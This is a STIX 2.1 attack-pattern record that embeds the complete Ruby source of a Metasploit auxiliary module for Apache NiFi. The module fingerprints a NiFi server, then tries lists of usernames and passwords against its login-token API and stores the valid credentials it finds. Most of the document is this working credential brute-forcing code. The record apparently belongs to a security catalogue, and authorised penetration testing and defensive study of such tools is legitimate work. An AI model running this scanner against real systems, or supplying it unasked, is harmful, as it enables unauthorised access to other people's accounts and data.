{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3cfb139-a687-4fda-a44e-694f59f04b78",
    "created": "2024-08-14T16:28:50.254763Z",
    "modified": "2024-08-14T16:28:50.254768Z",
    "name": "Apache NiFi Login Scanner",
    "description": " This module attempts to take login details for Apache NiFi websites and identify if they are valid or not.  Tested against NiFi major releases 1.14.0 - 1.21.0, and 1.13.0 Also works against NiFi <= 1.13.0, but the module needs to be adjusted: set SSL false set rport 8080  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_nifi_login.rb",
            "external_id": "apache_nifi_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache NiFi Login Scanner',\n        'Description' => %q{\n          This module attempts to take login details for Apache NiFi websites\n          and identify if they are valid or not.\n\n          Tested against NiFi major releases 1.14.0 - 1.21.0, and 1.13.0\n          Also works against NiFi <= 1.13.0, but the module needs to be adjusted:\n          set SSL false\n          set rport 8080\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptString.new('TARGETURI', [ true, 'The URI of the Apache NiFi Application', '/'])\n      ]\n    )\n    register_advanced_options([\n      OptBool.new('SSL', [true, 'Negotiate SSL connection', true])\n    ])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      last_attempted_at: DateTime.now,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    vprint_status(\"Checking #{ip}\")\n    res = send_request_cgi!(\n      'uri' => normalize_uri(target_uri.path, 'nifi', 'login')\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    fail_with(Failure::NotVulnerable, \"Apache NiFi not detected on #{ip}\") unless res.body =~ %r{js/nf/nf-namespace\\.js\\?([\\d.]*)\">}\n\n    res = send_request_cgi!(\n      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'access', 'config')\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    res_json = res.get_json_document\n\n    unless res_json.dig('config', 'supportsLogin')\n      print_error(\"#{peer} - User login not supported, try visiting /nifi to gain access\")\n      return\n    end\n\n    each_user_pass do |user, pass|\n      res = send_request_cgi!(\n        'uri' => normalize_uri(target_uri.path, 'nifi-api', 'access', 'token'),\n        'method' => 'POST',\n        'vars_post' => {\n          'username' => user,\n          'password' => pass\n        }\n      )\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      if res.code == 201\n        print_good(\"#{peer} - Apache NiFi - Login successful as '#{user}' with password '#{pass}'\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: (ssl ? 'https' : 'http'),\n          user: user,\n          password: pass,\n          proof: res.body.to_s\n        )\n      elsif res.code == 409\n        fail_with(Failure::BadConfig, \"#{peer} - Logins only accepted on HTTPS\")\n      else\n        vprint_error(\"#{peer} - Apache NiFi - Failed to login as '#{user}' with password '#{pass}'\")\n      end\n    end\n  end\nend\n"
}